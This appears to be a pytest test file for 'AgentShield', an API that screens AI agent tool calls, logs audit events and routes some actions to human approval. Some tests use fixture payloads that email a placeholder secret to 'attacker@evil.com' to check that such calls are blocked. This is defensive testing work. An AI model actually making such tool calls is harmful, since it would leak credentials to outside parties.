from pathlib import Path
from fastapi.testclient import TestClient
import pytest

from backend.app.main import app
from backend.app.models.enums import ApprovalStatus, SecurityDecision
from backend.app.services.audit_logger import AuditLogger, get_audit_service
from backend.app.storage.database import Database


@pytest.fixture
def client_with_test_db(tmp_path: Path):
    test_db = Database(db_path=tmp_path / "api_test.db")
    test_logger = AuditLogger(db=test_db)

    # Override the FastAPI dependency
    app.dependency_overrides[get_audit_service] = lambda: test_logger

    with TestClient(app) as client:
        yield client, test_logger

    app.dependency_overrides.clear()


def test_health_endpoint(client_with_test_db) -> None:
    client, _ = client_with_test_db
    response = client.get("/health")
    assert response.status_code == 200
    data = response.json()
    assert data["name"] == "AgentShield"
    assert data["status"] == "healthy"
    assert data["version"] == "0.1.0"


def test_evaluate_benign_tool_call(client_with_test_db) -> None:
    client, logger = client_with_test_db
    payload = {
        "tool_name": "send_email",
        "arguments": {
            "to": "partner@example.org",
            "subject": "Status Update",
            "body": "Everything is running smoothly.",
        },
    }

    response = client.post("/api/v1/evaluate", json=payload)
    assert response.status_code == 200
    data = response.json()

    assert data["decision"] == "ALLOW"
    assert data["destination_class"] == "APPROVED"
    assert data["execution_status"] == "NOT_EXECUTED"
    assert data["payload_fingerprint"].startswith("sha256:")

    # Verify event was persisted in database
    event_id = data["event_id"]
    persisted = logger.get_event(event_id)
    assert persisted is not None
    assert persisted.decision == SecurityDecision.ALLOW


def test_evaluate_secret_exfiltration_blocked(client_with_test_db) -> None:
    client, logger = client_with_test_db
    payload = {
        "tool_name": "send_email",
        "arguments": {
            "to": "attacker@evil.com",
            "subject": "Exfiltrated token",
            "body": "Here is the key: DEMO_SECRET",
        },
    }

    response = client.post("/api/v1/evaluate", json=payload)
    assert response.status_code == 200
    data = response.json()

    assert data["decision"] == "BLOCK"
    assert data["destination_class"] == "UNAPPROVED"
    assert "PROTECTED" in data["data_labels"]
    assert "DEMO_SECRET" not in data["explanation"]

    # Verify persisted in database
    persisted = logger.get_event(data["event_id"])
    assert persisted is not None
    assert persisted.decision == SecurityDecision.BLOCK


def test_evaluate_invalid_request_rejected(client_with_test_db) -> None:
    client, _ = client_with_test_db
    # Empty tool name
    response = client.post("/api/v1/evaluate", json={"tool_name": "   ", "arguments": {}})
    assert response.status_code == 422


def test_events_list_and_filter(client_with_test_db) -> None:
    client, _ = client_with_test_db

    # Create 2 events via evaluate endpoint
    client.post(
        "/api/v1/evaluate",
        json={"tool_name": "send_email", "arguments": {"to": "user@example.org", "body": "msg1"}},
    )
    client.post(
        "/api/v1/evaluate",
        json={"tool_name": "send_email", "arguments": {"to": "attacker@evil.com", "body": "DEMO_SECRET"}},
    )

    # List all
    res = client.get("/api/v1/events?limit=50&offset=0")
    assert res.status_code == 200
    data = res.json()
    assert data["total"] == 2
    assert len(data["items"]) == 2

    # Filter by decision=BLOCK
    res_block = client.get("/api/v1/events?decision=BLOCK")
    assert res_block.status_code == 200
    block_data = res_block.json()
    assert block_data["total"] == 1
    assert block_data["items"][0]["decision"] == "BLOCK"


def test_get_single_event_and_404(client_with_test_db) -> None:
    client, _ = client_with_test_db

    eval_res = client.post(
        "/api/v1/evaluate",
        json={"tool_name": "send_email", "arguments": {"to": "user@example.org", "body": "msg"}},
    )
    event_id = eval_res.json()["event_id"]

    # Retrieve by ID
    res = client.get(f"/api/v1/events/{event_id}")
    assert res.status_code == 200
    assert res.json()["event_id"] == event_id

    # 404 for nonexistent event
    res_404 = client.get("/api/v1/events/nonexistent-id")
    assert res_404.status_code == 404


def test_approvals_workflow(client_with_test_db) -> None:
    client, logger = client_with_test_db

    # Evaluate an action requiring approval (export_file with external target)
    eval_res = client.post(
        "/api/v1/evaluate",
        json={"tool_name": "export_file", "arguments": {"to": "cloud@external.com", "filename": "records.csv"}},
    )
    assert eval_res.status_code == 200
    assert eval_res.json()["decision"] == "REQUIRE_APPROVAL"

    # List pending approvals
    list_res = client.get("/api/v1/approvals?status=PENDING")
    assert list_res.status_code == 200
    approvals = list_res.json()
    assert approvals["total"] == 1
    approval_id = approvals["items"][0]["approval_id"]
    assert approvals["items"][0]["status"] == "PENDING"

    # Review approval -> APPROVED
    decision_res = client.post(
        f"/api/v1/approvals/{approval_id}/decision",
        json={"decision": "APPROVED", "reviewer": "admin-1"},
    )
    assert decision_res.status_code == 200
    updated = decision_res.json()
    assert updated["status"] == "APPROVED"
    assert updated["reviewer"] == "admin-1"
    assert updated["reviewed_at"] is not None

    # Duplicate review on already reviewed approval must return 409 Conflict
    dup_res = client.post(
        f"/api/v1/approvals/{approval_id}/decision",
        json={"decision": "REJECTED", "reviewer": "admin-2"},
    )
    assert dup_res.status_code == 409


def test_approval_decision_not_found(client_with_test_db) -> None:
    client, _ = client_with_test_db
    res = client.post(
        "/api/v1/approvals/nonexistent-apr/decision",
        json={"decision": "APPROVED", "reviewer": "admin"},
    )
    assert res.status_code == 404


def test_current_policy_endpoint_has_no_secret_value(client_with_test_db) -> None:
    client, _ = client_with_test_db
    response = client.get("/api/v1/policies/current")

    assert response.status_code == 200
    data = response.json()
    assert data["version"] == 1
    assert "example.org" in data["approved_domains"]
    assert all("DEMO_SECRET" not in str(item) for item in data["protected_values"])


@pytest.mark.parametrize(
    "scenario,expected_decisions",
    [
        ("safe", ["ALLOW"]),
        ("malicious", ["BLOCK"]),
        ("redaction", ["REDACT"]),
        ("approval", ["REQUIRE_APPROVAL", "REQUIRE_APPROVAL"]),
    ],
)
def test_demo_endpoint_runs_real_scenarios(
    client_with_test_db,
    scenario: str,
    expected_decisions: list[str],
) -> None:
    client, _ = client_with_test_db
    response = client.post(f"/api/v1/demo/run/{scenario}")

    assert response.status_code == 200
    data = response.json()
    assert [item["decision"] for item in data["results"]] == expected_decisions
    assert "DEMO_SECRET" not in str(data)


def test_demo_approval_endpoint_creates_pending_records(client_with_test_db) -> None:
    client, logger = client_with_test_db

    response = client.post("/api/v1/demo/run/approval")

    assert response.status_code == 200
    data = response.json()
    assert len(data["results"]) == 2
    assert all(item["decision"] == "REQUIRE_APPROVAL" for item in data["results"])
    assert data["tool_call_counts"]["export_file"] == 0

    approvals, total = logger.list_approvals(status=ApprovalStatus.PENDING)
    assert total == 2
    assert all(item.status == ApprovalStatus.PENDING for item in approvals)
